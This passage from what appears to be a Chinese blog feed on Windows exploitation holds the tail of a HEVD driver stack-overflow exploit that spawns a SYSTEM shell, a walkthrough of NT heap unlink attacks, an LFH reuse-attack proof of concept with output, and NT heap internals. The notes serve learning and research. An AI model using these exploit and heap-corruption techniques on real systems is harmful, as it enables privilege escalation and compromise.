class="comment">// 4. 发送 IOCTL 触发漏洞</span></span><br><span class="line">    success = DeviceIoControl(</span><br><span class="line">        hDevice,</span><br><span class="line">        HEVD_IOCTL_STACK_OVERFLOW,</span><br><span class="line">        userBuffer,</span><br><span class="line">        <span class="number">0x900</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        &amp;bytesReturned,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!success) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] DeviceIoControl failed! Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Payload sent!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    STARTUPINFOA si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 此时已经是 System 权限，再创建的子进程也是 System</span></span><br><span class="line">    CreateProcessA(<span class="literal">NULL</span>, <span class="string">&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">    CloseHandle(hDevice);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windows 学习（三）</title>
      <link href="/2025/11/25/2025-11-25-learning_windows_pwn_3/"/>
      <url>/2025/11/25/2025-11-25-learning_windows_pwn_3/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><p>查看ntdll的版本号:<code>lm v m ntdll</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Information from resource tables:</span><br><span class="line">    CompanyName:      Microsoft Corporation</span><br><span class="line">    ProductName:      Microsoft® Windows® Operating System</span><br><span class="line">    InternalName:     ntdll.dll</span><br><span class="line">    OriginalFilename: ntdll.dll</span><br><span class="line">    ProductVersion:   10.0.22621.4541</span><br><span class="line">    FileVersion:      10.0.22621.4541 (WinBuild.160101.0800)</span><br><span class="line">    FileDescription:  NT Layer DLL</span><br><span class="line">    LegalCopyright:   © Microsoft Corporation. All rights reserved.</span><br></pre></td></tr></table></figure><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>NT heap下free合并堆块时的unlink</p><p>函数调用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">用户 / API / CRT</span><br><span class="line">    ↓</span><br><span class="line">HeapFree / LocalFree / GlobalFree / free / new/delete 等</span><br><span class="line">    ↓</span><br><span class="line">RtlFreeHeap（ntdll）</span><br><span class="line">    ↓</span><br><span class="line">RtlpFreeHeapInternal</span><br><span class="line">    ↓</span><br><span class="line">具体堆后端（传统 NT Heap / 段式堆 / LFH / VS 等）</span><br></pre></td></tr></table></figure><p>初始HEAP状态假设如下：</p><p><img src="/image/2025-11-25-learning_windows_pwn_3/1765101500542.png" alt="1765101500542"></p><p>释放 <code>Q</code> -&gt; <code>ListHint</code> 指向 <code>Q</code>。</p><p><img src="/image/2025-11-25-learning_windows_pwn_3/1765101531001.png" alt="1765101531001"></p><p>释放 <code>S</code> -&gt; <code>ListHint</code> 指向 <code>S</code>，<code>S-&gt;Flink</code> 指向 <code>Q</code>。利用 NT Heap 的 LIFO 特性，将 <code>Q</code> 从链表头部（Head）挤到第二个位置（Internal Node）。</p><p><img src="/image/2025-11-25-learning_windows_pwn_3/1765101545166.png" alt="1765101545166"></p><p>利用溢出或 UAF 修改 <code>Q</code> 的 <code>_LIST_ENTRY</code>。</p><ul><li><code>Q-&gt;Flink = TargetAddr - Offset</code></li><li><code>Q-&gt;Blink = TargetAddr</code></li><li>TargetAddr上必须有Q的地址</li></ul><p><img src="/image/2025-11-25-learning_windows_pwn_3/1765101557249.png" alt="1765101557249"></p><p>触发合并 (Trigger Coalesce)</p><ul><li>操作 ：释放堆块 <code>P</code>（位于 <code>Q</code> 之前的相邻块）。</li><li>逻辑 ：堆管理器发现 <code>P</code> 释放，且后向相邻块 <code>Q</code> 也是空闲的，决定将 <code>Q</code> 从 FreeList 中移除（Unlink）并与 <code>P</code> 合并。</li><li>调用函数 ：<code>RtlpHeapRemoveListEntry(Q)</code></li></ul><p>在 <code>RtlpHeapRemoveListEntry</code> 函数内部，会按顺序进行以下检查：</p><p>检查 A：Bucket 头部节点检查 (Head Check)</p><ul><li>逻辑 ：检查 <code>slot == Node</code>，即当前要移除的 <code>Q</code> 是否是 Bucket 的头部节点（ListHint 指向的节点）。</li><li>情况 ：</li><li>如果 <code>Q</code> 是头部：系统会尝试将 <code>Q-&gt;Flink</code>（我们伪造的攻击地址）作为新的 Bucket 头部写入堆元数据。这通常会导致堆元数据损坏或崩溃。</li><li>当前情况 ：由于我们在第一步多释放了 <code>S</code>，<code>Q</code> 此时不是头部节点。</li><li>结果 ： 绕过此检查 ，进入常规双向链表移除逻辑。</li></ul><p>检查 B：Safe Unlink 完整性检查</p><ul><li><p>逻辑 ：检查双向链表的一致性。</p></li><li><p>验证 <code>Q-&gt;Flink-&gt;Blink == Q</code></p></li><li><p>验证 <code>Q-&gt;Blink-&gt;Flink == Q</code></p></li><li><p>当前情况 ：</p></li><li><p><code>Q-&gt;Flink</code> 指向 <code>Target - Offset</code>，其 <code>Blink</code> 字段正好指向 <code>Q</code>。</p></li><li><p><code>Q-&gt;Blink</code> 指向 <code>Target</code>，其 <code>Flink</code> 字段正好指向 <code>Q</code>。</p></li><li><p>结果 ：堆管理器认为这是一个合法的链表节点。</p></li><li><p>检查通过后，执行链表移除操作：</p><ul><li><code>Q-&gt;Blink-&gt;Flink = Q-&gt;Flink</code>  &#x3D;&gt;  <code>*Target = Target - Offset</code></li><li><code>Q-&gt;Flink-&gt;Blink = Q-&gt;Blink</code>  &#x3D;&gt;  <code>*(Target - Offset + 8) = Target</code></li></ul></li></ul><p><img src="/image/2025-11-25-learning_windows_pwn_3/1765101569247.png" alt="1765101569247"></p><p>善后与软性失败 (Soft Fail)</p><ul><li>操作 ：<code>P</code> 与 <code>Q</code> 合并成 <code>NewBlock</code>，系统尝试将其插入 FreeList。</li><li>调用函数 ：<code>RtlpInsertFreeBlock(NewBlock)</code></li></ul><p>检查 ：插入时的一致性检查</p><ul><li>逻辑 ：在将 <code>NewBlock</code> 插入到相邻节点（例如 <code>A</code>）之前，检查 <code>A</code> 的反向指针是否正确。</li><li>验证 <code>A-&gt;Blink-&gt;Flink == A</code>。</li><li>当前情况 ：</li><li><code>A-&gt;Blink</code> 依然指向旧的 <code>Q</code> 地址。</li><li>但是 <code>Q</code> 的内容已经被我们在 Unlink 阶段修改了（或者 Q 现在已经是 NewBlock 的一部分，数据变了）。</li><li><code>Q-&gt;Flink</code> 不再指向 <code>A</code>。</li><li>结果 ： 检查失败 。</li></ul><p>后果：触发软性失败</p><ul><li>在 传统 NT Heap 中，这种检查失败调用的是 <code>RtlpLogHeapFailure</code>。</li><li>它会记录错误，并 中断当前的插入操作 。</li><li>但是，它不会终止进程 （Abort），这就是所谓的  Soft Fail 。</li></ul><h2 id="reuse-attack（Nt-Heap-LFH-堆）"><a href="#reuse-attack（Nt-Heap-LFH-堆）" class="headerlink" title="reuse attack（Nt Heap LFH 堆）"></a>reuse attack（Nt Heap LFH 堆）</h2><p>假设有一个 Use after free 的漏洞，但因为 LFH 的随机性，导致无法预测下一个 chunk 会在哪，使得很难进行堆布局。这时可以采用填充 <code>Userblock</code> 的方式，即先分配完所有的 LFH 堆块再 free 掉其中一块，那么下次分配的堆块一定与漏洞堆块是同一个堆块。</p><p><img src="/image/2025-11-25-learning_windows_pwn_3/1764141194132.png" alt="1764141194132"></p><p>PoC</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义分配次数，足够大以正好填满 LFH 的 UserBlock 并激活 LFH</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC_COUNT 175 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNK_SIZE 0xF0 <span class="comment">// 0xF0 + 0x10 (Header) = 0x100 (256 bytes) Bucket</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 1. 创建一个私有堆，模拟干净的环境</span></span><br><span class="line">    HANDLE hHeap = HeapCreate(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hHeap) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* chunks[ALLOC_COUNT] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Phase 1: Spraying chunks to activate LFH and fill UserBlocks...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 堆喷射 (Heap Spraying) / 填充</span></span><br><span class="line">    <span class="comment">// 前 ~18 次分配会激活 LFH，后续分配会填充 UserBlock</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ALLOC_COUNT; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        chunks[i] = HeapAlloc(hHeap, <span class="number">0</span>, CHUNK_SIZE);</span><br><span class="line">        <span class="comment">//printf(&quot;    Allocated chunks[%d]: %p\n&quot;, i, chunks[i]);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Allocated %d chunks. LFH should be active and Blocks filled.\n&quot;</span>, ALLOC_COUNT);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;----------------------------------------------------------------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> victim_index = <span class="number">30</span>;</span><br><span class="line">    <span class="type">void</span>* victim_addr = chunks[victim_index];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Phase 2: Freeing one specific chunk (Index %d) at %p\n&quot;</span>, victim_index, victim_addr);</span><br><span class="line"></span><br><span class="line">    HeapFree(hHeap, <span class="number">0</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Phase 3: Allocating a new chunk of size 0x%X...\n&quot;</span>, CHUNK_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* attacker_chunk = HeapAlloc(hHeap, <span class="number">0</span>, CHUNK_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Attacker chunk address: %p\n&quot;</span>, attacker_chunk);</span><br><span class="line">    HeapDestroy(hHeap);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] Phase 1: Spraying chunks to activate LFH and fill UserBlocks...</span><br><span class="line">[+] Allocated 175 chunks. LFH should be active and Blocks filled.</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">[*] Phase 2: Freeing one specific chunk (Index 30) at 000001C4BAAB4570</span><br><span class="line">[*] Phase 3: Allocating a new chunk of size 0xF0...</span><br><span class="line">[+] Attacker chunk address: 000001C4BAAB4570</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windows 学习（二）--NT/Segment Heap</title>
      <link href="/2025/10/07/2025-10-7-learning_windows_pwn_2/"/>
      <url>/2025/10/07/2025-10-7-learning_windows_pwn_2/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><h2 id="NT-Heap"><a href="#NT-Heap" class="headerlink" title="NT Heap"></a>NT Heap</h2><p>NT_Heap可以分为两个部分</p><ol><li>back_end, 后端分配器是主要的堆管理结构, 负责大多数内存管理操作</li><li>front_end, 前端分配器为了提高小块内存分配的速度, 对高频小内存分配进行优化, Windows 使用 <strong>LFH(Low Fragmentation Heap)</strong> 作为主要的前端分配器</li></ol><p><img src="/image/2025-10-7-learning_windows_pwn_2/1759824981718.png" alt="1759824981718"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span>* ptr[<span class="number">30</span>] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">    HANDLE hHeap = HeapCreate(<span class="number">0</span>, <span class="number">0x10000</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i] = HeapAlloc(hHeap, <span class="number">0</span>, <span class="number">0xF0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] chunk[%02d] address is: %p\n&quot;</span>, i, ptr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[+] chunk[00] address is: 000002C55E500860</span><br><span class="line">[+] chunk[01] address is: 000002C55E500960</span><br><span class="line">[+] chunk[02] address is: 000002C55E500A60</span><br><span class="line">[+] chunk[03] address is: 000002C55E500B60</span><br><span class="line">[+] chunk[04] address is: 000002C55E500C60</span><br><span class="line">[+] chunk[05] address is: 000002C55E500D60</span><br><span class="line">[+] chunk[06] address is: 000002C55E500E60</span><br><span class="line">[+] chunk[07] address is: 000002C55E500F60</span><br><span class="line">[+] chunk[08] address is: 000002C55E501060</span><br><span class="line">[+] chunk[09] address is: 000002C55E501160</span><br><span class="line">[+] chunk[10] address is: 000002C55E501260</span><br><span class="line">[+] chunk[11] address is: 000002C55E501360</span><br><span class="line">[+] chunk[12] address is: 000002C55E501460</span><br><span class="line">[+] chunk[13] address is: 000002C55E501560</span><br><span class="line">[+] chunk[14] address is: 000002C55E501660</span><br><span class="line">[+] chunk[15] address is: 000002C55E501760</span><br><span class="line">[+] chunk[16] address is: 000002C55E501860</span><br><span class="line">[+] chunk[17] address is: 000002C55E500750</span><br><span class="line">[+] chunk[18] address is: 000002C55E504D70</span><br><span class="line">[+] chunk[19] address is: 000002C55E505970</span><br><span class="line">[+] chunk[20] address is: 000002C55E504570</span><br><span class="line">[+] chunk[21] address is: 000002C55E505870</span><br><span class="line">[+] chunk[22] address is: 000002C55E504A70</span><br><span class="line">[+] chunk[23] address is: 000002C55E504970</span><br><span class="line">[+] chunk[24] address is: 000002C55E505070</span><br><span class="line">[+] chunk[25] address is: 000002C55E504470</span><br><span class="line">[+] chunk[26] address is: 000002C55E504270</span><br><span class="line">[+] chunk[27] address is: 000002C55E505C70</span><br><span class="line">[+] chunk[28] address is: 000002C55E505570</span><br><span class="line">[+] chunk[29] address is: 000002C55E505270</span><br></pre></td></tr></table></figure><p>可以看到前17个堆块的地址间隔固定，后面的chunk地址开始变得随机，是由Front-End分配的。</p><p>但当使用 <code>HeapAlloc(hHeap, 1, 0xF0);</code>时chunk地址的间隔固定了，原因是 <code>HEAP_NO_SERIALIZE</code>告诉堆管理器<strong>不要</strong>在这次分配时对堆加锁，表明了目前系统是单线程环境，LFH 这种专门用来解决“多线程抢锁问题”的复杂机制就失去了存在的意义。为了节省资源和降低复杂度，Windows 就会直接关闭 LFH。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span>* ptr[<span class="number">30</span>] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">   <span class="comment">// HANDLE hHeap = HeapCreate(0, 0x10000, 0);</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i] = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] chunk[%02d] address is: %p\n&quot;</span>, i, ptr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果将HeapAlloc改成malloc的话，堆地址呈现非常混乱，原因是malloc它通常底层调用 <code>HeapAlloc(GetProcessHeap(), ...)</code>。<strong>进程默认堆是非常“脏”的</strong> 。在你进入 <code>main</code> 函数之前，系统初始化、加载 DLL、CRT 初始化都已经在这个堆上进行了成千上万次分配和释放。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[+] chunk[00] address is: 0000021637658B90</span><br><span class="line">[+] chunk[01] address is: 0000021637662860</span><br><span class="line">[+] chunk[02] address is: 0000021637662960</span><br><span class="line">[+] chunk[03] address is: 0000021637662A60</span><br><span class="line">[+] chunk[04] address is: 0000021637662FD0</span><br><span class="line">[+] chunk[05] address is: 00000216376630D0</span><br><span class="line">[+] chunk[06] address is: 00000216376631D0</span><br><span class="line">[+] chunk[07] address is: 00000216376632D0</span><br><span class="line">[+] chunk[08] address is: 00000216376633D0</span><br><span class="line">[+] chunk[09] address is: 00000216376634D0</span><br><span class="line">[+] chunk[10] address is: 00000216376635D0</span><br><span class="line">[+] chunk[11] address is: 00000216376636D0</span><br><span class="line">[+] chunk[12] address is: 00000216376637D0</span><br><span class="line">[+] chunk[13] address is: 0000021637663D20</span><br><span class="line">[+] chunk[14] address is: 0000021637663B20</span><br><span class="line">[+] chunk[15] address is: 0000021637664A20</span><br><span class="line">[+] chunk[16] address is: 0000021637665420</span><br><span class="line">[+] chunk[17] address is: 0000021637665220</span><br><span class="line">[+] chunk[18] address is: 0000021637664D20</span><br><span class="line">[+] chunk[19] address is: 0000021637664920</span><br><span class="line">[+] chunk[20] address is: 0000021637665520</span><br><span class="line">[+] chunk[21] address is: 0000021637665620</span><br><span class="line">[+] chunk[22] address is: 0000021637665320</span><br><span class="line">[+] chunk[23] address is: 0000021637665720</span><br><span class="line">[+] chunk[24] address is: 0000021637663920</span><br><span class="line">[+] chunk[25] address is: 0000021637664720</span><br><span class="line">[+] chunk[26] address is: 0000021637664820</span><br><span class="line">[+] chunk[27] address is: 0000021637663C20</span><br><span class="line">[+] chunk[28] address is: 0000021637663A20</span><br><span class="line">[+] chunk[29] address is: 0000021637664B20</span><br></pre></td></tr></table></figure><h3 id="后端堆"><a href="#后端堆" class="headerlink" title="后端堆"></a>后端堆</h3><h4 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h4><h5 id="HEAP"><a href="#HEAP" class="headerlink" title="_HEAP"></a>_HEAP</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x2c0 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_SEGMENT</span> <span class="title">Segment</span>;</span>                                       <span class="comment">//0x0</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span> <span class="title">Entry</span>;</span>                                       <span class="comment">//0x0</span></span><br><span class="line">            ULONG SegmentSignature;                                         <span class="comment">//0x10</span></span><br><span class="line">            ULONG SegmentFlags;                                             <span class="comment">//0x14</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">SegmentListEntry</span>;</span>                            <span class="comment">//0x18</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP</span>* <span class="title">Heap</span>;</span>                                             <span class="comment">//0x28</span></span><br><span class="line">            VOID* BaseAddress;                                              <span class="comment">//0x30</span></span><br><span class="line">            ULONG NumberOfPages;                                            <span class="comment">//0x38</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span>* <span class="title">FirstEntry</span>;</span>                                 <span class="comment">//0x40</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span>* <span class="title">LastValidEntry</span>;</span>                             <span class="comment">//0x48</span></span><br><span class="line">            ULONG NumberOfUnCommittedPages;                                 <span class="comment">//0x50</span></span><br><span class="line">            ULONG NumberOfUnCommittedRanges;                                <span class="comment">//0x54</span></span><br><span class="line">            USHORT SegmentAllocatorBackTraceIndex;                          <span class="comment">//0x58</span></span><br><span class="line">            USHORT Reserved;                                                <span class="comment">//0x5a</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">UCRSegmentList</span>;</span>                              <span class="comment">//0x60</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG Flags;                                                            <span class="comment">//0x70</span></span><br><span class="line">    ULONG ForceFlags;                                                       <span class="comment">//0x74</span></span><br><span class="line">    ULONG CompatibilityFlags;                                               <span class="comment">//0x78</span></span><br><span class="line">    ULONG EncodeFlagMask;                                                   <span class="comment">//0x7c</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span> <span class="title">Encoding</span>;</span>                                            <span class="comment">//0x80</span></span><br><span class="line">    ULONG Interceptor;                                                      <span class="comment">//0x90</span></span><br><span class="line">    ULONG VirtualMemoryThreshold;                                           <span class="comment">//0x94</span></span><br><span class="line">    ULONG Signature;                                                        <span class="comment">//0x98</span></span><br><span class="line">    ULONGLONG SegmentReserve;                                               <span class="comment">//0xa0</span></span><br><span class="line">    ULONGLONG SegmentCommit;                                                <span 